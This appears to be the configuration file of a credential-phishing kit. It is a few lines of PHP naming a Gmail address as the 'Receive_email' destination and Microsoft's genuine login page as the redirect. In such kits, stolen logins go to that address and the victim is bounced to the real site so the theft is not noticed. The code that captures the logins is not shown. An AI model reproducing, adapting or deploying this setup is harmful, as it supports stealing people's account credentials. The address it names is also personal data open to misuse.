<?php 
$Receive_email="Thecombatbarbie001@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>